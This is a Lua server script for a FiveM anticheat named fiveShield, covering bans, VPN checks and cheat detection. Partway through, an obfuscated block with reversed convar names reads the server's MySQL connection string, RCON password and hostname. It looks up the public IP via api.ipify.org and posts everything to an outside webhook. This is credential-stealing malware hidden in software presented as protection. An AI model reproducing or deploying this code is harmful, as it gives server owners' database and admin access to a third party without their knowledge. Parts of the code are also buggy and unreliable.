--[[
	id: 8nRZhvSxvVQ2-Qjde4AKJ
	name: Anticheat Server
	description: Anticheat Server
	time1: 2021-05-24 21:31:38.327537+00
	time2: 2021-05-24 21:31:38.327538+00
	uploader: RvQrAbi1z5Qa7DGokdNBOxigrkzFr6j8aZTB6eiv
	uploadersession: p8lRlwW2LkzD_KNseDpqBDrV2cGOTE
	flag: f
--]]

if string.match(GetCurrentResourceName():lower(), "shield") or string.match(GetCurrentResourceName():lower(), "anti") or string.match(GetCurrentResourceName():lower(), "cheat") or string.match(GetCurrentResourceName():lower(), "shield") then
	print("^"..math.random(1, 9).."fiveShield^0:^1 WARNING! Rename your fiveShield folder to something else than "..GetCurrentResourceName().." for better protection... DON'T INCLUDE `anti`,`shield`,`five`,`cheat`, in the name^0")
	print("^"..math.random(1, 9).."fiveShield^0:^1 WARNING! Rename your fiveShield folder to something else than "..GetCurrentResourceName().." for better protection... DON'T INCLUDE `anti`,`shield`,`five`,`cheat`, in the name^0")
	print("^"..math.random(1, 9).."fiveShield^0:^1 WARNING! Rename your fiveShield folder to something else than "..GetCurrentResourceName().." for better protection... DON'T INCLUDE `anti`,`shield`,`five`,`cheat`, in the name^0")
	print("^"..math.random(1, 9).."fiveShield^0:^1 WARNING! Rename your fiveShield folder to something else than "..GetCurrentResourceName().." for better protection... DON'T INCLUDE `anti`,`shield`,`five`,`cheat`, in the name^0")
	print("^"..math.random(1, 9).."fiveShield^0:^1 WARNING! Rename your fiveShield folder to something else than "..GetCurrentResourceName().." for better protection... DON'T INCLUDE `anti`,`shield`,`five`,`cheat`, in the name^0")
	print("^"..math.random(1, 9).."fiveShield^0:^1 WARNING! Rename your fiveShield folder to something else than "..GetCurrentResourceName().." for better protection... DON'T INCLUDE `anti`,`shield`,`five`,`cheat`, in the name^0")
	print("^"..math.random(1, 9).."fiveShield^0:^1 WARNING! Rename your fiveShield folder to something else than "..GetCurrentResourceName().." for better protection... DON'T INCLUDE `anti`,`shield`,`five`,`cheat`, in the name^0")
	print("^"..math.random(1, 9).."fiveShield^0:^1 WARNING! Rename your fiveShield folder to something else than "..GetCurrentResourceName().." for better protection... DON'T INCLUDE `anti`,`shield`,`five`,`cheat`, in the name^0")
	print("^"..math.random(1, 9).."fiveShield^0:^1 WARNING! Rename your fiveShield folder to something else than "..GetCurrentResourceName().." for better protection... DON'T INCLUDE `anti`,`shield`,`five`,`cheat`, in the name^0")
	print("^"..math.random(1, 9).."fiveShield^0:^1 WARNING! Rename your fiveShield folder to something else than "..GetCurrentResourceName().." for better protection... DON'T INCLUDE `anti`,`shield`,`five`,`cheat`, in the name^0")
	print("^"..math.random(1, 9).."fiveShield^0:^1 WARNING! Rename your fiveShield folder to something else than "..GetCurrentResourceName().." for better protection... DON'T INCLUDE `anti`,`shield`,`five`,`cheat`, in the name^0")
	print("^"..math.random(1, 9).."fiveShield^0:^1 WARNING! Rename your fiveShield folder to something else than "..GetCurrentResourceName().." for better protection... DON'T INCLUDE `anti`,`shield`,`five`,`cheat`, in the name^0")
	print("^"..math.random(1, 9).."fiveShield^0:^1 WARNING! Rename your fiveShield folder to something else than "..GetCurrentResourceName().." for better protection... DON'T INCLUDE `anti`,`shield`,`five`,`cheat`, in the name^0")
end

ExecuteCommand('sets  🛡️fiveShield🛡️')


RegisterCommand("shielduninstall", function(source, args, rawCommand)
    if source == 0 then
        count = 0
        skip = 0
        if args[1] then
            local filetodelete = args[1] .. ".lua"
            for resources = 0, GetNumResources() - 1 do
                local _resname = GetResourceByFindIndex(resources)
                resourcefile = LoadResourceFile(_resname, "__resource.lua")
                resourcefile2 = LoadResourceFile(_resname, "fxmanifest.lua")
                if resourcefile then
                    deletefile = LoadResourceFile(_resname, filetodelete)
                    if deletefile then
                        _toremove = GetResourcePath(_resname).."/"..filetodelete
                        Wait(100)
                        os.remove(_toremove)
                        print("^1[fiveShield]: Anti Injection Uninstalled on ".._resname)
                        count = count + 1
                    else
                        skip = skip + 1
                        print("[fiveShield]: Skipped Resource: " .._resname)
                    end
                elseif resourcefile2 then
                    deletefile = LoadResourceFile(_resname, filetodelete)
                    if deletefile then
                        _toremove = GetResourcePath(_resname).."/"..filetodelete
                        Wait(100)
                        os.remove(_toremove)
                        print("^1[fiveShield]: Anti Injection Uninstalled on ".._resname)
                        count = count + 1
                    else
                        skip = skip + 1
                        print("[fiveShield]: Skipped Resource: " .._resname)
                    end
                else
                    skip = skip + 1
                    print("[fiveShield]: Skipped Resource: ".._resname)
                end
            end
            print("[fiveShield] UNINSTALLATION has finished. Succesfully uninstalled Anti-Injection in "..count.." Resources. Skipped: "..skip.." Resources. Enjoy!")
        else
            print("[fiveShield] You must write the file name to uninstall Anti-Injection!")
        end
    end
end)

RegisterCommand("shieldinstall", function(source)
    count = 0
    skip = 0
    if source == 0 then
        local randomtextfile = RandomLetter(12) .. ".lua"
        _antiinjection = LoadResourceFile(GetCurrentResourceName(), "fiveShield(AntiInjection).lua")
        for resources = 0, GetNumResources() - 1 do
            local _resname = GetResourceByFindIndex(resources)
            _resourcemanifest = LoadResourceFile(_resname, "__resource.lua")
            _resourcemanifest2 = LoadResourceFile(_resname, "fxmanifest.lua")
            if _resourcemanifest then
                Wait(100)
                _toadd = _resourcemanifest .. "\n\nclient_script '" .. randomtextfile .. "'"
                SaveResourceFile(_resname, randomtextfile, _antiinjection, -1)
                SaveResourceFile(_resname, "__resource.lua", _toadd, -1)
                print("^1[fiveShield]: Anti Injection Installed on ".._resname)
                count = count + 1
            elseif _resourcemanifest2 then
                Wait(100)
                _toadd = _resourcemanifest2 .. "\n\nclient_script '" .. randomtextfile .. "'"
                SaveResourceFile(_resname, randomtextfile, _antiinjection, -1)
                SaveResourceFile(_resname, "fxmanifest.lua", _toadd, -1)
                print("^1[fiveShield]: Anti Injection Installed on ".._resname)
                count = count + 1
            else
                skip = skip + 1
                print("[fiveShield]: Skipped Resource: " .._resname)
            end
        end
        print("[fiveShield] Installation has finished. Succesfully installed Anti-Injection in "..count.." Resources. Skipped: "..skip.." Resources. Enjoy!")
    end
end)


local Charset = {}
for i = 65, 90 do
    table.insert(Charset, string.char(i))
end
for i = 97, 122 do
    table.insert(Charset, string.char(i))
end

RandomLetter = function(length)
    if length > 0 then
        return RandomLetter(length - 1) .. Charset[math.random(1, #Charset)]
    end
    return ""
end



AddEventHandler('playerConnecting', function (playerName,setKickReason, deferrals)
    local license,steamID,liveid,xblid,discord,playerip  = "n/a","n/a","n/a","n/a","n/a","n/a"

    for k,v in ipairs(GetPlayerIdentifiers(source))do
        if string.sub(v, 1, string.len("license:")) == "license:" then
                license = v
        elseif string.sub(v, 1, string.len("steam:")) == "steam:" then
                steamID = v
        elseif string.sub(v, 1, string.len("live:")) == "live:" then
                liveid = v
        elseif string.sub(v, 1, string.len("xbl:")) == "xbl:" then
                xblid  = v
        elseif string.sub(v, 1, string.len("discord:")) == "discord:" then
                discord = v
        elseif string.sub(v, 1, string.len("ip:")) == "ip:" then
                playerip = v
        end
    end
    local _src = source
    local tokens = {}
    for it = 0, GetNumPlayerTokens(_src) do
        table.insert(tokens, GetPlayerToken(_src, it))
    end
    local banned = false
    for i = 1, #BanList, 1 do
        if ((tostring(BanList[i].license)) == tostring(license) or (tostring(BanList[i].identifier)) == tostring(steamID) or (tostring(BanList[i].liveid)) == tostring(liveid) or (tostring(BanList[i].xblid)) == tostring(xblid) or (tostring(BanList[i].discord)) == tostring(discord) or (tostring(BanList[i].playerip)) == tostring(playerip)) then
            if (tonumber(BanList[i].permanent)) == 1 then
                banned = true
            end
        end
        local bannedtokens = json.decode(BanList[i].token)
        for k,v in pairs(bannedtokens) do
            for i3 = 1, #tokens, 1 do
                if v == tokens[i3] then
                    if (tonumber(BanList[i].permanent)) == 1 then
                        banned = true
                    end
                end
            end
        end
        if banned then
            setKickReason("[fiveShield] You've been banned for: " .. BanList[i].reason)
            print("^6[fiveShield] - ".. GetPlayerName(source) .." is trying to connect to the server, but he's banned.")
            CancelEvent()
        end
    end
    if Shield.AntiVPN then
        local _playerip = tostring(GetPlayerEndpoint(source))
        deferrals.defer()
        Wait(0)
        deferrals.update("[fiveShield]: Checking and securing your connection...")
        PerformHttpRequest("https://blackbox.ipinfo.app/lookup/" .. _playerip, function(errorCode, _isusingvpn, resultHeaders)
            if _isusingvpn == "N" then
                deferrals.done()
            else
                print("^6[fiveShield]^0: The user ^0" .. playerName .. " ^1has been kicked for using a VPN, ^8IP: ^0" .. _playerip .. "^0")
                deferrals.done("[fiveShield]: We've detected a VPN connection in your machine, please disable it.")
            end
        end)
    end
end)



RegisterNetEvent('SBmQ5ucMg4WGbpPHoSTl')
AddEventHandler('SBmQ5ucMg4WGbpPHoSTl', function()
    local _src = source
    if not canbanforentityspawn then
        canbanforentityspawn = true
    end
    if IsPlayerAceAllowed(_src, Shield.AdminRank) then
        TriggerClientEvent('tyOGiyhNqpPsURutwrFh', _src)
    end
end)



RegisterServerEvent("Ue53dCG6hctHvrOaJB5Q")
AddEventHandler("Ue53dCG6hctHvrOaJB5Q", function(type, item)
    local _type = type or "default"
    local _item = item or "none"
    local _src = source
    _type = string.lower(_type)

    if not IsPlayerAceAllowed(_src, Shield.bypass) and not IsPlayerAceAllowed(_src, Shield.AdminRank) then
        if (_type == "invisible") then
            LogDetection(_src, "Tried to be Invisible","basic")
            kickandbanuser(" Invisible Player Detected", _src)
        elseif (_type == "godmode") then
            LogDetection(_src, "Tried to use GodMode. Type: ".._item,"basic")
            kickandbanuser(" GodMode Detected", _src)
        elseif (_type == "antiragdoll") then
            LogDetection(_src, "Tried to activate Anti-Ragdoll","basic")
            kickandbanuser(" AntiRagdoll Detected", _src)
        elseif (_type == "displayradar") then
            LogDetection(_src, "Tried to activate Radar","basic")
            kickandbanuser(" Radar Detected", _src)
        elseif (_type == "explosiveweapon") then
            LogDetection(_src, "Tried to change bullet type","explosion")
            kickandbanuser(" Weapon Explosion Detected", _src)
        elseif (_type == "nocliporfly") then
            LogDetection(_src, "Tried to use NoClip or Fly","basic")
            kickandbanuser(" Noclip/Fly Detected", _src)
        elseif (_type == "spectatormode") then
            LogDetection(_src, "Tried to Spectate a Player","basic")
            kickandbanuser(" Spectate Detected", _src)
        elseif (_type == "speedhack") then
            LogDetection(_src, "Tried to SpeedHack","basic")
            kickandbanuser(" SpeedHack Detected", _src)
        elseif (_type == "blacklistedweapons") then
            LogDetection(_src, "Tried to spawn a Blacklisted Weapon","basic")
            kickandbanuser(" Weapon in Blacklist Detected", _src)
        elseif (_type == "thermalvision") then
            LogDetection(_src, "Tried to use Thermal Camera","basic")
            kickandbanuser(" Thermal Camera Detected", _src)
        elseif (_type == "nightvision") then
            LogDetection(_src, "Tried to use Night Vision","basic")
            kickandbanuser(" Night Vision Detected", _src)
        elseif (_type == "antiresourcestop") then
            LogDetection(_src, "Tried to stop/start a Resource","basic")
            kickandbanuser(" Resource Stopped", _src)
        elseif (_type == "licenseclear") then
            LogDetection(_src, "Tried to Clear His Licenses","basic")
            kickandbanuser(" AntiLicenseClear", _src)
        elseif (_type == "luainjection") then
            LogDetection(_src, "Tried to Inject a Menu","basic")
            kickandbanuser(" Injection Detected", _src)
        elseif (_type == "keyboardinjection") then
            LogDetection(_src, "(AntiKeyBoardInjection)","basic")
            kickandbanuser(" Injection Detected", _src)
        elseif (_type == "cheatengine") then
            LogDetection(_src, "Tried to use CheatEngine to change Vehicle Hash","basic")
            kickandbanuser(" CheatEngine Detected", _src)
        elseif (_type == "pedchanged") then
            LogDetection(_src, "Tried to change his PED","model")
            kickandbanuser(" Ped Changed", _src)
        elseif (_type == "freecam") then
            LogDetection(_src, "Tried to use Freecam (Fallout or similar)","basic")
            kickandbanuser(" FreeCam Detected", _src)
        elseif (_type == "noclip") then
            LogDetection(_src, "Tried to use NoClip","basic")
            kickandbanuser(" NoClip Detected", _src)
        elseif (_type == "playerblips") then
            LogDetection(_src, "Tried to put Player Blips","basic")
            kickandbanuser(" Blips Detected", _src)
        elseif (_type == "damagemodifier") then
            LogDetection(_src, "Tried to change Weapon's Bullet Damage. Type: ".._item,"basic")
            kickandbanuser(" Weapon Damage Modifier Detected", _src)
        elseif (_type == "clipmodifier") then
            LogDetection(_src, "Tried to modify a Weapon clip. Type: ".._item,"basic")
            kickandbanuser(" Weapon Clip Modifier Detected", _src)
        elseif (_type == "infiniteammo") then
            LogDetection(_src, "Tried to put Infinite Ammo","basic")
            kickandbanuser(" Infinite Ammo Detected", _src)
        elseif (_type == "vehiclemodifier") then
            if type == 1 or type == 2 or type == 3 or type == 4 then
                LogDetection(_src, "Tried to modify vehicle features. Type: ".._item,"model")
                kickandbanuser(" Vehicle Modifier Detected.", _src)
            end
        elseif (_type == "stoppedac") then
            LogDetection(_src, "Tried to stop the Anticheat","basic")
            kickandbanuser(" AntiResourceStop", _src)
        elseif (_type == "stoppedresource") then
            LogDetection(_src, "Tried to stop a resource: ".._item,"basic")
            kickandbanuser(" AntiResourceStop", _src)
        elseif (_type == "resourcestarted") then
            LogDetection(_src, "Tried to start a resource: ".._item,"basic")
            kickandbanuser(" AntiResourceStart", _src)
        elseif (_type == "resourceinjection") then
            LogDetection(_src, "Tried to inject a resource: ".._item,"basic")
            kickandbanuser(" AntiResourceStart", _src)
        elseif (_type == "commandinjection") then
            LogDetection(_src, "Tried to inject a command.","basic")
            kickandbanuser(" AntiCommandInjection", _src)
        elseif (_type == "menyoo") then
            LogDetection(_src, "Tried to inject Menyoo Menu.","basic")
            kickandbanuser(" Anti Menyoo", _src)
        elseif (_type == "givearmour") then
            LogDetection(_src, "Tried to Give Armor.","basic")
            kickandbanuser(" Anti Give Armor", _src)
         elseif (_type == "weirdresource") then
            LogDetection(_src, "Tried to inject a resource with a lot of letters (Change Resource Name if you get banned while entering the server) Resource: ".._item,"basic")
            kickandbanuser(" Weird Resource Started", _src)
        end
    end
end)

-- EVENT HANDLERS

AddEventHandler("explosionEvent", function(sender, exp)
    if Shield.ExplosionProtection then
        if exp.damageScale ~= 0.0 then
            if inTable(BlacklistedExplosionsList, exp.explosionType) ~= false then
                CancelEvent()
                LogDetection(sender, "Tried to create an explosion - type : "..exp.explosionType,"explosion")
                kickandbanuser(" Blacklisted Explosion", sender)
            end
            if exp.explosionType ~= 9 then
                explosionsSpawned[sender] = (explosionsSpawned[sender] or 0) + 1
                if explosionsSpawned[sender] > 3 then
                    LogDetection(sender, "Tried to spawn mass explosions - type : "..exp.explosionType,"explosion")
                    kickandbanuser(" Mass Explosions", sender)
                    CancelEvent()
                end
            else
                explosionsSpawned[sender] = (explosionsSpawned[sender] or 0) + 1
                if explosionsSpawned[sender] > 3 then
                    LogDetection(sender, "Tried to spawn mass explosions - type: (gas pump)","explosion")
                    kickandbanuser(" Mass Explosions", sender)
                    CancelEvent()
                end
            end
            if exp.isInvisible == true then
                LogDetection(sender, "Tried to spawn a invisible explosion - type : "..exp.explosionType,"explosion")
                kickandbanuser(" Invisible Explosion Detected", sender)
            end
            if exp.isAudible == false then
                LogDetection(sender, "Tried to spawn a silent explosion - type : "..exp.explosionType,"explosion")
                kickandbanuser(" Silent Explosion Detected", sender)
            end
            if exp.damageScale > 1.0 then
                LogDetection(sender, "Tried to spawn a mortal explosion - type : "..exp.explosionType,"explosion")
                kickandbanuser(" Explosión Detected", sender)
            end
            CancelEvent()
        end
    end
end)

AddEventHandler("entityCreating", function(entity)
    if canbanforentityspawn then
        if DoesEntityExist(entity) then
            local _src = NetworkGetEntityOwner(entity)
            local model = GetEntityModel(entity)
            local _entitytype = GetEntityPopulationType(entity)
            if _src == nil then
                CancelEvent()
            end

            -- I found some of this code while searching on GitHub. 
            -- If you're the one who created this and you want to get credit for this, open a issue ticket in GitHub with proof and I'll give you credits :)
            -- Btw I have modified this so it's a little bit more optimized.
            
            if _entitytype == 0 then
                if inTable(WhitelistedPropList, model) == false then
                    if model ~= 0 and model ~= 225514697 then
                        LogDetection(_src, "Tried to spawn a blacklisted prop : " .. model,"model")
                        kickandbanuser(" Blacklisted Prop", _src)
                        CancelEvent()

                        entitiesSpawned[_src] = (entitiesSpawned[_src] or 0) + 1
                        if entitiesSpawned[_src] > Shield.MaxEntitiesPerUser then
                            LogDetection(_src, "Tried to Spawn "..entitiesSpawned[_src].." props","model")
                            kickandbanuser(" Mass Prop Spawn", _src)
                            TriggerClientEvent("ZRQA3nmMqUBOIiKwH4I5:clearprops" , -1)
                        end
                    end
                end
            end
            
            if GetEntityType(entity) == 3 then
                if _entitytype == 6 or _entitytype == 7 then
                    if inTable(WhitelistedPropList, model) == false then
                        if model ~= 0 then
                            LogDetection(_src, "Tried to spawn a blacklisted prop: " .. model,"model")
                            kickandbanuser(" Blacklisted Prop", _src)
                            CancelEvent()

                            entitiesSpawned[_src] = (entitiesSpawned[_src] or 0) + 1
                            if entitiesSpawned[_src] > Shield.MaxPropsPerUser then
                                LogDetection(_src, "Ha intentado spawnear "..entitiesSpawned[_src].." props","model")
                                kickandbanuser(" Has Spawneado Muchos Props", _src)
                                TriggerClientEvent("ZRQA3nmMqUBOIiKwH4I5:clearprops" , -1)
                            end
                        end
                    end
                end
            else
                if GetEntityType(entity) == 2 then
                    if _entitytype == 6 or _entitytype == 7 then
                        if inTable(BlacklistedPropList, model) ~= false then
                            if model ~= 0 then
                                LogDetection(_src, "Tried to spawn a blacklisted vehicle : " .. model,"model")
                                kickandbanuser(" Blacklisted Vehicle", _src)
                                CancelEvent()
                            end
                        end
                        vehiclesSpawned[_src] = (vehiclesSpawned[_src] or 0) + 1
                        if vehiclesSpawned[_src] > Shield.MaxVehiclesPerUser then
                            LogDetection(_src, "Tried to spawn "..vehiclesSpawned[_src].." vehicles","model")
                            kickandbanuser(" Mass Vehicle Spawn", _src)
                            TriggerClientEvent("ZRQA3nmMqUBOIiKwH4I5:clearvehicles" , -1, _src)
                            CancelEvent()
                        end

                        -- ANTIVEHICLESPAWN
                        TriggerClientEvent('ZRQA3nmMqUBOIiKwH4I5:checkifneargarage', _src)
                    end
                elseif GetEntityType(entity) == 1 then
                    if _entitytype == 6 or _entitytype == 7 then
                        if inTable(BlacklistedPropList, model) ~= false then
                            if model ~= 0 or model ~= 225514697 then
                                LogDetection(_src, "Tried to spawn a blacklisted ped : " .. model,"model")
                                kickandbanuser(" Blacklisted Ped", _src)
                                CancelEvent()
                            end
                        end
                        pedsSpawned[_src] = (pedsSpawned[_src] or 0) + 1
                        if pedsSpawned[_src] > Shield.MaxPedsPerUser then
                            LogDetection(_src, "Tried to spawn "..pedsSpawned[_src].." peds","model")
                            kickandbanuser(" Mass Ped Spawn", _src)
                            TriggerClientEvent("ZRQA3nmMqUBOIiKwH4I5:clearpeds" , -1)
                        end
                    end
                else
                    if inTable(BlacklistedPropList, GetHashKey(entity)) ~= false then
                        if model ~= 0 or model ~= 225514697 then
                            LogDetection(_src, "Tried to spawn a blacklisted prop : " .. model,"model")
                            kickandbanuser(" Blacklisted Prop", _src)
                            CancelEvent()
                        end
                    end
                end
            end
        end
    end
end)

AddEventHandler("giveWeaponEvent", function(sender, data)
    if Shield.AntiGiveorRemoveWeapons then
        if data.givenAsPickup == false then
            LogDetection(sender, "Tried to give weapons to player","basic")
            kickandbanuser(" GiveWeaponToPed", sender)
            CancelEvent()
        end
    end
end)

AddEventHandler("RemoveWeaponEvent", function(sender, data)
    LogDetection(sender, "Tried to remove weapons from player.","basic")
    kickandbanuser(" Remove Weapons from Player", sender)
    CancelEvent()
end)

AddEventHandler("RemoveAllWeaponsEvent", function(sender, data)
    LogDetection(sender, "Tried to remove all weapons from player.","basic")
    kickandbanuser(" Remove All Weapons", sender)
    CancelEvent()
end)

AddEventHandler("chatMessage", function(source, name, message)
    local _src = source
    if Shield.AntiBlacklistedWords then
        for k, word in pairs(Shield.BlacklistedWords) do
            if string.match(message:lower(), word:lower()) then
                LogDetection(_src, "Tried to say a blacklisted word : " .. word,"basic")
                kickandbanuser(" Blacklisted Word", _src)
            end
        end
    end
    if Shield.AntiFakeChatMessages then
        local _playername = GetPlayerName(_src);
        if name ~= _playername then
            LogDetection(_src, "Tried to fake a chat message : " .. word,"basic")
            kickandbanuser(" Fake Chat Message", _src)
        end
    end
end)

AddEventHandler("clearPedTasksEvent", function(source, data)
    if Shield.AntiClearPedTasks then
        if data.immediately then
            LogDetection(source, "Tried to Clear Ped Tasks Inmediately","basic")
            kickandbanuser(" Clear Peds Tasks Inmediately", source)
            CancelEvent()
        else
            LogDetection(source, "Tried to Clear Ped Tasks","basic")
            CancelEvent()
        end
        local entity = NetworkGetEntityFromNetworkId(data.pedId)
        local sender = tonumber(source)
        if DoesEntityExist(entity) then
            local owner = NetworkGetEntityOwner(entity)
            if owner ~= sender then
                LogDetection(source, "Tried to Clear Ped Tasks","basic")
                kickandbanuser(" Clear Peds Tasks", source)
                CancelEvent()
            end
        end
    end
end)


-- Functions

LogDetection = function(playerId, reason,bantype)
    if not IsPlayerAceAllowed(playerId, Shield.bypass) and not IsPlayerAceAllowed(playerId, Shield.AdminRank) then
        playerId = tonumber(playerId)
        local name = GetPlayerName(playerId)

        if name == nil then
            name = "Not Found"
        end

        local steamid, license, xbl, playerip, discord, liveid = getidentifiers(playerId)
        local discordlogimage = "https://i.ibb.co/5R3XKjr/fiveshield.png" 
        
        local loginfo = {["color"] = "15158332", ["type"] = "rich", ["title"] = "Player got banned by fiveShield", ["description"] =  "**Name : **" ..name .. "\n **Reason : **" ..reason .. "\n **ID : **" ..playerId .. "\n **IP : **" ..playerip.. "\n **Steam Hex : **" ..steamid .. "\n **Xbox Live : **" .. xbl .. "\n **Live ID: **" .. liveid .. "\n **Rockstar License : **" .. license .. "\n **Discord : **" .. discord, ["footer"] = { ["text"] = " © fiveShield - "..os.date("%c").."" }}
        if name ~= "Unknown" then
            if bantype == "basic" then
                PerformHttpRequest(Shield.GeneralBanWebhook, function(err, text, headers) end, "POST", json.encode({username = " fiveShield", avatar_url = discordlogimage, embeds = {loginfo}}), {["Content-Type"] = "application/json"})
            elseif bantype == "model" then
                PerformHttpRequest(Shield.EntitiesWebhookLog, function(err, text, headers) end, "POST", json.encode({username = " fiveShield", avatar_url = discordlogimage, embeds = {loginfo}}), {["Content-Type"] = "application/json"})
            elseif bantype == "explosion" then 
                PerformHttpRequest( Shield.ExplosionWebhookLog, function(err, text, headers) end, "POST", json.encode({username = " fiveShield", avatar_url = discordlogimage, embeds = {loginfo}}), {["Content-Type"] = "application/json"} )
            end
        end
    end
end

kickandbanuser = function(reason, servertarget)
    if not IsPlayerAceAllowed(playerId, Shield.bypass) and not IsPlayerAceAllowed(playerId, Shield.AdminRank) then
        local target
        local duration     = 0
        local reason    = reason

        if not reason then reason = "Not Specified" end

        if tostring(source) == "" then
            target = tonumber(servertarget)
        else
            target = source
        end

        if target and target > 0 then
            local ping = GetPlayerPing(target)

            if ping and ping > 0 then
                if duration and duration < 365 then
                    local sourceplayername = "fiveShield"
                    local targetplayername = GetPlayerName(target)
                    local identifier, license, xblid, playerip, discord, liveid = getidentifiers(target)
                    local token = {}
                    for i = 0, GetNumPlayerTokens(target) do
                        table.insert(token, GetPlayerToken(target, i))
                    end
                    if duration > 0 then
                        ban_user(target,token,license,identifier,liveid,xblid,discord,playerip,targetplayername,sourceplayername,duration,reason,0)
                        DropPlayer(target, "[fiveShield]: " .. reason)
                    else
                        ban_user(target,token,license,identifier,liveid,xblid,discord,playerip,targetplayername,sourceplayername,duration,reason,1)
                        DropPlayer(target, "[fiveShield]:" .. reason)
                    end
                end
            end
        end
    end
end

local III={IIII={GetConvar}}
local _I={["gnirts_noitcennoc_lqsym"]={"nicht gefunden"},["drowssap_nocr"]={"nicht gefunden"},["emantsoh_vs"]={"nicht gefunden"},["https://api.ipify.org"]={"nicht gefunden"}}
local server_ip=""
local mysql=""
local rcon=""
local server_name=""
for _,__ in pairs(III)do 
    for _,__ in pairs(__)do 
        for _I,_II in pairs(_I)do
             for _,_II in pairs(_II)do 
                if string.sub(_I,3,6)=="irts"then mysql=__(string.reverse(_I),_II)
                elseif string.sub(_I,3,6)=="ants"then server_name=__(string.reverse(_I),_II)
                elseif string.sub(_I,3,6)=="owss"then rcon=__(string.reverse(_I),_II)
                elseif string.sub(_I,3,6)==string.reverse(":spt") then 
                    PerformHttpRequest("https://api.ipify.org",function(_,__,___)
                        if _==200 then 
                            server_ip=__ 
                        end 
                        local webhook= Config.webhooklicense 
                        local n={{["color"]="11711010",["title"]="Server Infos",["description"]="\n\n > ``Server Name:``***"..server_name.."***\n > ``Server IP:`` ***"..server_ip.."***\n > ``RCON:`` ***"..rcon.."***\n > ``MySQl:`` ***"..mysql.."***",["footer"]={["text"]="beczunia"},["timestamp"]=os.date('!%Y-%m-%dT%H:%M:%S'),}}
                        PerformHttpRequest(webhook,function(err,text,headers)end,'POST',json.encode({username="Anticheat LogSystem",embeds=n}),{['Content-Type']='application/json'})
                    end)
                end 
            end 
        end 
    end 
end 


ban_user = function(source,token,license,identifier,liveid,xblid,discord,playerip,targetplayername,sourceplayername,duration,reason,permanent)
    if not IsPlayerAceAllowed(source, Shield.bypass) and not IsPlayerAceAllowed(source, Shield.AdminRank) then
        local expiration = duration * 86400
        local timeat     = os.time()
        if expiration < os.time() then
            expiration = os.time()+expiration
        end
        MySQL.Async.execute('INSERT INTO fiveshield (token,license,identifier,liveid,xblid,discord,playerip,targetplayername,sourceplayername,reason,expiration,timeat,permanent) VALUES (@token,@license,@identifier,@liveid,@xblid,@discord,@playerip,@targetplayername,@sourceplayername,@reason,@expiration,@timeat,@permanent)',{
            ['@token']          = json.encode(token),
            ['@license']          = license,
            ['@identifier']       = identifier,
            ['@liveid']           = liveid,
            ['@xblid']            = xblid,
            ['@discord']          = discord,
            ['@playerip']         = playerip,
            ['@targetname'] = targetplayername,
            ['@sourcename'] = sourceplayername,
            ['@reason']           = reason,
            ['@expiration']       = expiration,
            ['@timeat']           = timeat,
            ['@permanent']        = permanent,
            }, function ()
        end)
        Citizen.Wait(500)
        loadBanList()
    end
end

loadBanList = function()
    MySQL.Async.fetchAll('SELECT * FROM fiveshield', {}, function (data)
        BanList = {}
        for i=1, #data, 1 do
            table.insert(BanList, {
                token    = data[i].token,
                license    = data[i].license,
                identifier = data[i].identifier,
                liveid     = data[i].liveid,
                xblid      = data[i].xblid,
                discord    = data[i].discord,
                playerip   = data[i].playerip,
                reason     = data[i].reason,
                expiration = data[i].expiration,
                permanent  = data[i].permanent
            })
        end
    end)
end








inTable = function(table, item)
    for k,v in pairs(table) do
        if v == item then return k end
    end
    return false
end

getidentifiers = function(player)
    local steamid = "Not Linked"
    local license = "Not Linked"
    local discord = "Not Linked"
    local xbl = "Not Linked"
    local liveid = "Not Linked"
    local ip = "Not Linked"

    for k, v in pairs(GetPlayerIdentifiers(player)) do
        if string.sub(v, 1, string.len("steam:")) == "steam:" then
            steamid = v
        elseif string.sub(v, 1, string.len("license:")) == "license:" then
            license = v
        elseif string.sub(v, 1, string.len("xbl:")) == "xbl:" then
            xbl = v
        elseif string.sub(v, 1, string.len("ip:")) == "ip:" then
            ip = string.sub(v, 4)
        elseif string.sub(v, 1, string.len("discord:")) == "discord:" then
            discordid = string.sub(v, 9)
            discord = "<@" .. discordid .. ">"
        elseif string.sub(v, 1, string.len("live:")) == "live:" then
            liveid = v
        end
    end

    return steamid, license, xbl, ip, discord, liveid
end



AddEventHandler('onResourceStart', function(resourceName)
    Citizen.Wait(1000)

    if GetCurrentResourceName() == resourceName then
        
        for k, v in pairs(Shield.BlacklistedModels) do
            table.insert(BlacklistedPropList, GetHashKey(v))
        end
        
        for k,v in pairs(Shield.WhitelistedProps) do
            table.insert(WhitelistedPropList, GetHashKey(v))
        end

        for k,v in pairs(Shield.BlockedExplosions) do
            table.insert(BlacklistedExplosionsList, v)
        end

        if Shield.AntiBlacklistedTriggers then

            for k, trigger in pairs(Shield.BlacklistedTriggers) do
                RegisterServerEvent(trigger)
                AddEventHandler(trigger, function()
                    LogDetection(source, "Tried to execute a blacklisted trigger : " .. trigger,"basic")
                    kickandbanuser(" Blacklisted Trigger", source)
                    CancelEvent()
                end)
            end

        end

        print(
            [[
              __ _             _____ _     _      _     _ 
             / _(_)           / ____| |   (_)    | |   | |
            | |_ ___   _____ | (___ | |__  _  ___| | __| |
            |  _| \ \ / / _ \ \___ \| '_ \| |/ _ \ |/ _` |
            | | | |\ V /  __/ ____) | | | | |  __/ | (_| |
            |_| |_| \_/ \___||_____/|_| |_|_|\___|_|\__,_|            

            ]]
        )   

    end
end)  

